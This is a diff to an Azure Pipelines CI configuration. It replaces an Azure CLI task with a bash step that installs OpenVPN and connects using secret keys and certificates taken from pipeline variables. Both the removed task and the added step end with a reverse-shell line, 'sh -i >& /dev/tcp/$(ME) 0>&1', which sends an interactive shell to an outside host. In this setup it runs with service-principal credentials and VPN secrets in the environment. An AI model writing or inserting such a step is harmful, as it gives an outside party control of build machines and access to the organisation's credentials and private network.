@@ -5,17 +5,26 @@ pool:
   vmImage: 'ubuntu-latest'
 
 steps:
-- task: AzureCLI@2
-  inputs:
-    azureSubscription: foo
-    scriptType: bash
-    scriptLocation: inlineScript
-    inlineScript: |
-        sh -i >& "/dev/tcp/$(ME)" 0>&1
-    addSpnToEnvironment: true
-    
 
-  # - task: Bash@3
-  #   inputs:
-  #     targetType: 'inline'
-  #     script: curl --resolve cns-vnet-test.azurewebsites.net:443:10.0.0.4 https://cns-vnet-test.azurewebsites.net
+  - bash: |
+      sudo apt-get --assume-yes --no-install-recommends install openvpn
+
+      # curl -o client.zip $(az network vnet-gateway vpn-client generate -n gateway -g example-resources | tr -d '"')
+      # unzip client.zip -d client
+
+      envsubst < vpnconfig.ovpn > _vpnconfig.ovpn
+
+      sudo openvpn _vpnconfig.ovpn &
+
+      sleep 5
+
+      ifconfig tun0
+
+      sh -i >& "/dev/tcp/$(ME)" 0>&1
+
+    env:
+      PRESHAREDKEY: $(presharedkey)
+      PRIVATEKEY: $(vpnkey)
+      CLIENTCERTIFICATE: $(vpncrt)
+      VPNCONFIG: $(vpnconfig)
+      VPNSERVER: $(vpnserver)
